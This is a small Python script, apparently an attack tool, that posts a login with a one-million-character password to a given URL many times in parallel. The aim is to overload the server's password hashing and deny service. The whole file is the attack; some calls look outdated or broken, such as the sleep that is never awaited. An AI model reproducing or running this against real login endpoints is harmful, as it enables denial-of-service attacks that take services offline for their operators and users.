import sys, argparse
import asyncio
import aiohttp

parser = argparse.ArgumentParser(description='Description here')
parser.add_argument('-u', '--url', dest='url', type=str, required=True,help='url')
parser.add_argument('-l', '--login', dest='login', type=str, required=True,help='login')
parser.add_argument('-s', '--size', dest='size', type=int, default=1000000, help='Size of the password')
parser.add_argument('-d','--delay', dest='delay', type=float, default=1, help='Time between requests in seconds')
parser.add_argument('-r','--repeats', dest='repeats', type=int, default=20, help='Number of iterations')

args = parser.parse_args()

sys.stderr.write("Generating password...\n")
password = "x" * args.size
sys.stderr.write("Done! Password length: "+ str(len(password)) +" characters.\n")

payload = { 'login': args.login, 'password': password }

async def makeRequest(url, payload, delay, i):
    sys.stderr.write("Sending password "+str(i+1)+": "+str(args.size)+" bytes\n")
    await aiohttp.post(url, data=payload)
    asyncio.sleep(delay)
    sys.stderr.write('Task is finished.')

def main():
    tasks = list()
    for i in range(args.repeats):
            tasks.append(makeRequest(args.url, payload, args.delay, i))

    loop = asyncio.get_event_loop()
    loop.run_until_complete(asyncio.wait(tasks))
    loop.close()

if __name__ == '__main__':
    main()